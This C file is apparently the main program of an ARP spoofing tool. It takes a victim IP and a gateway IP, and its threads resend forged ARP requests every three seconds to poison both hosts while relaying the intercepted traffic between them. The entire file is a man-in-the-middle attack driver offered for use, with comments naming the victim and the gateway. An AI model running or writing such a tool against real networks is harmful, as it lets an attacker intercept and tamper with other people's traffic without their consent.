#include <stdio.h>
#include "utils.h"
#include "pcap.h"
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

void usage() {
    printf("syntax: pcap_test <interface> <sender_ip> <target_ip> <target_ip> <sender_ip>\n");
    printf("sample: pcap_test wlan0 192.168.9.2 192.168.9.1 192.168.9.1 192.168.9.2\n");
}

void *thread_arp_request(void *args){
    while(1){
    if(arp_request(((struct thread_args*)args)->interface , ((struct thread_args*)args)->sender_ip, ((struct thread_args*)args)->target_ip) != 0)
        break;
    sleep(3);
    }
}

void *thread_arp_relay(void *args){
    arp_relay(((struct thread_args*)args)->interface, ((struct thread_args*)args)->sender_ip, ((struct thread_args*)args)->target_ip);
}

int main(int argc, char *argv[])
{
    if (argc != 6) {
        usage();
        return -1;
    }
    struct thread_args *thread1_args = (struct thread_args*)malloc(sizeof(struct thread_args));
    struct thread_args *thread2_args = (struct thread_args*)malloc(sizeof(struct thread_args));

    pthread_t p_thread[4];

    thread1_args->interface = argv[1];    //interface
    thread1_args->sender_ip = argv[2];    //victim ip
    thread1_args->target_ip = argv[3];    //gateway ip

    thread2_args->interface = argv[1];    //interface
    thread2_args->sender_ip = argv[4];    //gateway ip
    thread2_args->target_ip = argv[5];    //victim ip

    pthread_create(&p_thread[0], NULL, thread_arp_request, (void *)thread1_args);
    pthread_create(&p_thread[1], NULL, thread_arp_relay, (void *)thread1_args);
    pthread_create(&p_thread[2], NULL, thread_arp_request, (void *)thread2_args);
    pthread_create(&p_thread[3], NULL, thread_arp_relay, (void *)thread2_args);

    pthread_join(p_thread[0], NULL);
    pthread_join(p_thread[1], NULL);
    pthread_join(p_thread[2], NULL);
    pthread_join(p_thread[3], NULL);

    return 0;
}
